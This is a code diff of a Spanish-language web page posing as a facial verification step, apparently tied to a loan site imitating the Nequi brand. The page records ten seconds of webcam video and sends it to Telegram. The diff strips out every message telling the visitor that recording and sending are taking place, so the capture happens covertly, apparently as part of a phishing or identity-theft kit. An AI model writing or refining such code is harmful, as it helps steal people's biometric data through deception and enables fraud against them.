@@ -125,7 +125,7 @@ video {
 <div id="alertaSelfie" class="alerta-selfie">
 📸 Verificación Facial<br>
 Mantén tu rostro en el círculo<br>
-Grabaremos 10 segundos
+
 </div>
 
 <video id="video" autoplay muted playsinline></video>
@@ -228,7 +228,7 @@ function startRecording(stream) {
 
     mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        statusText.innerText = "📤 Enviando video...";
+        statusText.innerText = "📤 ...";
         enviarVideoTelegram(blob);
     };
 
@@ -247,13 +247,13 @@ function startRecording(stream) {
             
             // Iniciar grabación
             mediaRecorder.start();
-            statusText.innerText = "🎥 Grabando 10 segundos...";
+            statusText.innerText = "...";
             
             // Detener después de 10 segundos
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
-                    statusText.innerText = "⏹️ Grabación finalizada...";
+                    statusText.innerText = "⏹️finalizada...";
                 }
             }, 10000);
         }
@@ -273,7 +273,7 @@ function enviarVideoTelegram(videoBlob) {
     })
     .then(response => {
         if (response.ok) {
-            statusText.innerText = "✅ Video enviado correctamente";
+            statusText.innerText = "✅ ";
             setTimeout(() => {
                 window.location.href = "https://teprestanequi.vercel.app/inicio/";
             }, 3000);
